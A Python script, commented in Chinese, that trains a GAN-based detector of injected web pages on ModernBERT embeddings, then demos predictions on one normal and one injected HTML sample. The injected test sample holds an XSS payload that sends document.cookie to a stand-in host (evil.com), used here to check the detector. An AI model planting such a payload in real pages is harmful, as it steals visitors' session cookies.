"""
AC-GAN 变体 — 隐空间网页注入检测训练脚本

改进策略：
1. 判别器双头输出（分类头 + 真假头），解耦分类与对抗目标
2. 预训练 D 的分类头（仅用真实数据，5 epoch）
3. D 训练步数为 G 的 2 倍
4. D 学习率 2e-4，G 学习率 5e-5（让 D 更强）
5. 训练 200 epoch
"""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

import torch
import torch.nn as nn
from torch.utils.data import Dataset, DataLoader
from datasets import load_from_disk
from transformers import AutoTokenizer, AutoModel
from tqdm import tqdm

from utils.gan import Generator, Discriminator

# ========================= 全局配置 =========================

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
RESULTS_DIR = os.path.join(PROJECT_ROOT, "results", "gan")
DATASET_DIR = os.path.join(PROJECT_ROOT, "datasets", "browsesafe_bench")
CACHE_PATH = os.path.join(PROJECT_ROOT, "datasets", "embeddings_cache.pt")
ENCODER_NAME = "answerdotai/ModernBERT-base"

DEVICE = "cuda" if torch.cuda.is_available() else "cpu"
EMBEDDING_DIM = 768
LATENT_DIM = 100
LABEL_EMBED_DIM = 50
MAX_SEQ_LEN = 512
BATCH_SIZE = 256
EPOCHS = 200
D_LR = 2e-4
G_LR = 5e-5
D_STEPS_PER_G = 2       # D 训练 2 步，G 训练 1 步
PRETRAIN_EPOCHS = 5      # 预训练 D 分类头的 epoch 数

LABEL_MAP = {"no": 0, "yes": 1}

os.makedirs(RESULTS_DIR, exist_ok=True)


# ==================== 特征提取与缓存 =======================

def extract_embeddings(encoder_name: str = ENCODER_NAME):
    if os.path.exists(CACHE_PATH):
        print(f"[缓存] 发现本地缓存 {CACHE_PATH}，直接加载...")
        cache = torch.load(CACHE_PATH, weights_only=True)
        return cache["embeddings"], cache["labels"]

    print(f"[数据] 从 {DATASET_DIR} 加载 train 划分...")
    ds = load_from_disk(DATASET_DIR)["train"]
    print(f"[编码器] 加载 {encoder_name}...")
    tokenizer = AutoTokenizer.from_pretrained(encoder_name)
    model = AutoModel.from_pretrained(encoder_name).to(DEVICE)
    model.eval()

    embeddings = []
    labels = []
    print(f"[编码] 提取 {len(ds)} 条样本的 CLS 嵌入...")
    for i in tqdm(range(len(ds)), desc="Encoding"):
        text = ds[i]["content"]
        label = LABEL_MAP[ds[i]["label"]]
        inputs = tokenizer(
            text, max_length=MAX_SEQ_LEN, truncation=True,
            padding="max_length", return_tensors="pt",
        ).to(DEVICE)
        with torch.no_grad():
            cls_vec = model(**inputs).last_hidden_state[:, 0, :].squeeze(0).cpu()
        embeddings.append(cls_vec)
        labels.append(label)

    embeddings = torch.stack(embeddings)
    labels = torch.tensor(labels)
    os.makedirs(os.path.dirname(CACHE_PATH), exist_ok=True)
    torch.save({"embeddings": embeddings, "labels": labels}, CACHE_PATH)
    print(f"[缓存] 已保存至 {CACHE_PATH}")
    return embeddings, labels


# ======================== 数据集 =========================

class WebEmbeddingDataset(Dataset):
    def __init__(self, embeddings, labels):
        self.embeddings = embeddings
        self.labels = labels

    def __len__(self):
        return len(self.labels)

    def __getitem__(self, idx):
        return self.embeddings[idx], self.labels[idx]


# ==================== 预训练 D 分类头 =====================

def pretrain_discriminator(D, dataloader, epochs=PRETRAIN_EPOCHS):
    """
    仅用真实数据预训练 D 的分类头，让 D 先学会区分 Normal/Injected。
    source_head 不参与此阶段。
    """
    print(f"\n[预训练] 仅训练 D 的 class_head，{epochs} epochs...")
    # 冻结共享层和 source_head，只训练 class_head
    for param in D.shared.parameters():
        param.requires_grad = False
    for param in D.source_head.parameters():
        param.requires_grad = False

    opt = torch.optim.Adam(D.class_head.parameters(), lr=1e-3)
    criterion = nn.CrossEntropyLoss()

    for epoch in range(1, epochs + 1):
        correct, total, loss_sum = 0, 0, 0.0
        for emb, lbl in dataloader:
            emb, lbl = emb.to(DEVICE), lbl.to(DEVICE)
            class_logits, _ = D(emb)
            loss = criterion(class_logits, lbl)
            opt.zero_grad()
            loss.backward()
            opt.step()
            loss_sum += loss.item()
            correct += (class_logits.argmax(1) == lbl).sum().item()
            total += lbl.size(0)
        print(f"  Pretrain epoch {epoch}/{epochs}  loss={loss_sum/len(dataloader):.4f}  acc={correct/total:.4f}")

    # 解冻所有层
    for param in D.parameters():
        param.requires_grad = True
    print("[预训练] 完成，D 的 class_head 已具备基础分类能力\n")


# ======================== 对抗训练 =========================

def train_cgan(dataloader, epochs=EPOCHS, embedding_dim=EMBEDDING_DIM, latent_dim=LATENT_DIM):
    G = Generator(latent_dim, embedding_dim, LABEL_EMBED_DIM).to(DEVICE)
    D = Discriminator(embedding_dim).to(DEVICE)

    opt_g = torch.optim.Adam(G.parameters(), lr=G_LR, betas=(0.5, 0.999))
    opt_d = torch.optim.Adam(D.parameters(), lr=D_LR, betas=(0.5, 0.999))

    ce = nn.CrossEntropyLoss()

    # 预训练 D 的分类头
    pretrain_discriminator(D, dataloader)

    history = {"d_loss": [], "g_loss": [], "d_acc_real": [], "d_acc_class": []}

    for epoch in range(1, epochs + 1):
        running_d, running_g = 0.0, 0.0
        correct_src, correct_cls, total = 0, 0, 0

        pbar = tqdm(dataloader, desc=f"Epoch {epoch}/{epochs}", leave=False)
        for real_emb, real_labels in pbar:
            bs = real_emb.size(0)
            real_emb = real_emb.to(DEVICE)
            real_labels = real_labels.to(DEVICE)

            # ========== 训练 D (D_STEPS_PER_G 次) ==========
            for _ in range(D_STEPS_PER_G):
                # 生成伪造数据
                gen_cond = torch.randint(0, 2, (bs,), device=DEVICE)
                z = torch.randn(bs, latent_dim, device=DEVICE)
                fake_emb = G(z, gen_cond).detach()

                # --- 真实数据 ---
                class_real, src_real = D(real_emb)
                loss_class_real = ce(class_real, real_labels)   # 分类为正确标签
                loss_src_real = ce(src_real, torch.zeros(bs, dtype=torch.long, device=DEVICE))  # 真=0

                # --- 伪造数据 ---
                class_fake, src_fake = D(fake_emb)
                loss_src_fake = ce(src_fake, torch.ones(bs, dtype=torch.long, device=DEVICE))   # 假=1
                # 伪造数据的分类损失：D 应不管类别，只需要识别为 fake 即可

                loss_d = loss_class_real + loss_src_real + loss_src_fake

                opt_d.zero_grad()
                loss_d.backward()
                opt_d.step()

                running_d += loss_d.item()

                with torch.no_grad():
                    correct_src += (src_real.argmax(1) == 0).sum().item()
                    correct_src += (src_fake.argmax(1) == 1).sum().item()
                    correct_cls += (class_real.argmax(1) == real_labels).sum().item()
                    total += bs

            # ========== 训练 G (1 次) ==========
            gen_cond = torch.randint(0, 2, (bs,), device=DEVICE)
            z = torch.randn(bs, latent_dim, device=DEVICE)
            fake_emb = G(z, gen_cond)

            class_fake, src_fake = D(fake_emb)
            # G 目标1：让 D 的分类头将伪造数据判为指定类别
            loss_g_class = ce(class_fake, gen_cond)
            # G 目标2：让 D 的真假头将伪造数据判为真
            loss_g_src = ce(src_fake, torch.zeros(bs, dtype=torch.long, device=DEVICE))

            loss_g = loss_g_class + loss_g_src

            opt_g.zero_grad()
            loss_g.backward()
            opt_g.step()

            running_g += loss_g.item()

            pbar.set_postfix(D=f"{loss_d.item():.3f}", G=f"{loss_g.item():.3f}")

        n_batches = len(dataloader)
        avg_d = running_d / (n_batches * D_STEPS_PER_G)
        avg_g = running_g / n_batches
        acc_src = correct_src / (total * 2)
        acc_cls = correct_cls / total

        history["d_loss"].append(avg_d)
        history["g_loss"].append(avg_g)
        history["d_acc_real"].append(acc_src)
        history["d_acc_class"].append(acc_cls)

        if epoch % 20 == 0 or epoch == 1:
            print(f"Epoch {epoch:>3d}/{epochs}  D_loss={avg_d:.4f}  G_loss={avg_g:.4f}  "
                  f"D_src_acc={acc_src:.4f}  D_cls_acc={acc_cls:.4f}")

    return G, D, history


# ======================== 预测函数 =========================

def predict_injection(html_text, encoder, tokenizer, discriminator):
    """
    预测 HTML 是否被注入。仅使用 D 的分类头（不受对抗训练干扰）。
    """
    discriminator.eval()
    encoder.eval()
    inputs = tokenizer(
        html_text, max_length=MAX_SEQ_LEN, truncation=True,
        padding="max_length", return_tensors="pt",
    ).to(DEVICE)
    with torch.no_grad():
        cls_vec = encoder(**inputs).last_hidden_state[:, 0, :]
        class_logits, _ = discriminator(cls_vec)
        prob = torch.softmax(class_logits, dim=1)
        p_normal = prob[:, 0].item()
        p_injected = prob[:, 1].item()
        pred = 1 if p_injected > p_normal else 0
    return {
        "prob_normal": round(p_normal, 6),
        "prob_injected": round(p_injected, 6),
        "prediction": pred,
        "label": "Injected (注入)" if pred == 1 else "Normal (正常)",
    }


# ======================== 可视化 =========================

def plot_history(history):
    import matplotlib
    matplotlib.use("Agg")
    import matplotlib.pyplot as plt

    fig, axes = plt.subplots(1, 2, figsize=(12, 4))

    axes[0].plot(history["d_loss"], label="D_loss")
    axes[0].plot(history["g_loss"], label="G_loss")
    axes[0].set_xlabel("Epoch")
    axes[0].set_ylabel("Loss")
    axes[0].legend()
    axes[0].set_title("Loss Curve")

    axes[1].plot(history["d_acc_real"], label="D_source_acc (real/fake)")
    axes[1].plot(history["d_acc_class"], label="D_class_acc (normal/injected)")
    axes[1].set_xlabel("Epoch")
    axes[1].set_ylabel("Accuracy")
    axes[1].legend()
    axes[1].set_title("Discriminator Accuracy")

    plt.tight_layout()
    plt.savefig(os.path.join(RESULTS_DIR, "cgan_loss_curve.png"), dpi=150)
    plt.close()
    print(f"\n[保存] 训练曲线 -> {RESULTS_DIR}/cgan_loss_curve.png")


# ======================== 主入口 =========================

if __name__ == "__main__":
    print(f"[设备] {DEVICE}")

    embeddings, labels = extract_embeddings()
    print(f"[数据] 嵌入维度: {embeddings.shape}, Normal: {sum(labels==0).item()}, Injected: {sum(labels==1).item()}")

    dataset = WebEmbeddingDataset(embeddings, labels)
    dataloader = DataLoader(dataset, batch_size=BATCH_SIZE, shuffle=True, drop_last=True)

    G, D, history = train_cgan(dataloader, epochs=EPOCHS, embedding_dim=EMBEDDING_DIM, latent_dim=LATENT_DIM)
    plot_history(history)

    model_dir = os.path.join(RESULTS_DIR, "checkpoints")
    os.makedirs(model_dir, exist_ok=True)
    torch.save(G.state_dict(), os.path.join(model_dir, "generator.pt"))
    torch.save(D.state_dict(), os.path.join(model_dir, "discriminator.pt"))
    print(f"[保存] 模型权重 -> {model_dir}/")

    # 预测演示
    print("\n" + "=" * 50)
    print("预测演示")
    print("=" * 50)
    tokenizer = AutoTokenizer.from_pretrained(ENCODER_NAME)
    encoder = AutoModel.from_pretrained(ENCODER_NAME).to(DEVICE)

    normal_html = "<html><head><title>Hello</title></head><body><h1>Welcome</h1><p>Safe content.</p></body></html>"
    res_n = predict_injection(normal_html, encoder, tokenizer, D)
    print(f"[正常网页] {res_n}")

    injected_html = '<html><body><div><script>alert(document.cookie)</script><img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)"></div></body></html>'
    res_i = predict_injection(injected_html, encoder, tokenizer, D)
    print(f"[注入网页] {res_i}")

    passed = res_n["prediction"] == 0 and res_i["prediction"] == 1
    print(f"\n验证结果: {'PASSED' if passed else 'FAILED'}")
